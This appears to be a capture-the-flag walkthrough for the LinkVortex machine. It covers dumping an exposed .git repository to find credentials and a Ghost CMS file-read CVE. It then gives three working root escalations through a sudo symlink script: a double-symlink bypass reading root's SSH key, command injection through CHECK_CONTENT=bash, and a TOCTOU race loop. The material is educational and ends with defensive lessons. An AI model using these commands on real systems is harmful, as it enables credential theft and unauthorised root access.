Git Source Code Leak → Ghost Admin Password

dev.linkvortex.htb exposes its .git directory — dump the entire repository:

$ pip3 install git-dumper
$ git-dumper http://dev.linkvortex.htb/.git/ ./git

The .git/config confirms Ghost v5.58.0. But the real prize is in the git history:

$ cd git
$ git log -p -S "password"  # show commits that changed "password"
.git history is where the secrets are Current files may be clean, but git records every change ever made. Developers often commit real credentials, then "fix" them in the next commit — but the old value stays in the diff forever. git log -p -S "keyword" searches all diffs for a string, surfacing passwords that were added then removed.

Phase 3

Privilege Escalation — Triple Vulnerability sudo Script

Sudo Enumeration

bob@linkvortex:~$ sudo -l
env_keep+=CHECK_CONTENT
(ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png

The script checks if a .png file is a symlink. If its target contains etc or root, it deletes it. Otherwise, it moves the file to /var/quarantined/ and optionally cats its content when CHECK_CONTENT is set. Three vulnerabilities exist:

Method 1: Double Symlink Bypass (Recommended)

Why double symlinks work The script only checks the first layer of the symlink target with grep -Eq '(etc|root)'. It doesn't recursively resolve the chain. By adding an intermediate symlink whose path doesn't contain the blocked words, the sensitive target is hidden from the check — but cat still follows the full chain to the final file. 
# Layer 1: points to root's SSH key (contains "root" but script won't see it)
bob@linkvortex:~$ ln -s /root/.ssh/id_rsa /home/bob/id_rsa.txt

# Layer 2: .png points to the intermediate file (no "root" or "etc" in path)
bob@linkvortex:~$ ln -s /home/bob/id_rsa.txt /home/bob/exploit.png

# Trigger — CHECK_CONTENT=true makes the script cat the file
bob@linkvortex:~$ CHECK_CONTENT=true sudo /usr/bin/bash /opt/ghost/clean_symlink.sh /home/bob/exploit.png

Method 2: Command Injection via CHECK_CONTENT (Fastest)

# The script does: if $CHECK_CONTENT; then ...
# Without quotes, bash executes CHECK_CONTENT as a command!
bob@linkvortex:~$ ln -s /tmp/whatever a.png
bob@linkvortex:~$ CHECK_CONTENT=bash sudo /usr/bin/bash /opt/ghost/clean_symlink.sh a.png

root@linkvortex:~#  ← instant root shell

Method 3: TOCTOU Race Condition

# Terminal 1: continuously replace quarantined file with a symlink to root's key
while true; do ln -sf /root/root.txt /var/quarantined/toctou.png; done

# Terminal 2: trigger with a safe symlink
ln -s /home/bob/.bashrc /dev/shm/toctou.png
CHECK_CONTENT=true sudo /usr/bin/bash /opt/ghost/clean_symlink.sh /dev/shm/toctou.png

Appendix

Key Takeaways

.git directories are a treasure trove.

Beyond current source code, git history (git log -p -S) reveals credentials that were committed and later removed. Always dump and search the full history.

Ghost CMS has authenticated file read vulnerabilities.

CVE-2023-40028 reads arbitrary files with admin access. Target config.production.json first — it contains database and SMTP credentials.

One sudo script, three vulnerabilities.

Double symlink bypass (non-recursive check), command injection (unquoted variable in if), and TOCTOU (check-then-use gap). Real-world scripts often have multiple flaws — look for all of them.

Unquoted bash variables in if are command injection.

if $VAR; then executes $VAR as a command. Setting CHECK_CONTENT=bash gives an instant root shell. Always quote and use [ "$VAR" = "true" ].
